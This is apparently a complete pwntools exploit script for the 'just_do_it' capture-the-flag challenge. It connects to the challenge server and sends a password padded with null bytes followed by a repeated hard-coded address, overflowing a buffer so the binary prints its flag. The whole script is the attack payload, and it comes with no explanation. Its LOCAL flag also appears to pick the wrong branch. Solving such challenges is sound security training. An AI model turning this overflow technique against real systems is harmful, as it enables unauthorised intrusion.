from pwn import *

LOCAL = True

if LOCAL == True:
  r = remote ("pwn1.chal.ctf.westerns.tokyo", 12345)

else:
  r = process ("just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa")

bin_elf = ELF ("./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa")


flag_addr = 0x0804a080

r.recvuntil ("Input the password.")
r.sendline ("P@ssw0rd".ljust (0x10, "\x00") + p32 (flag_addr) * 4)

print r.recv ()

r.interactive ()
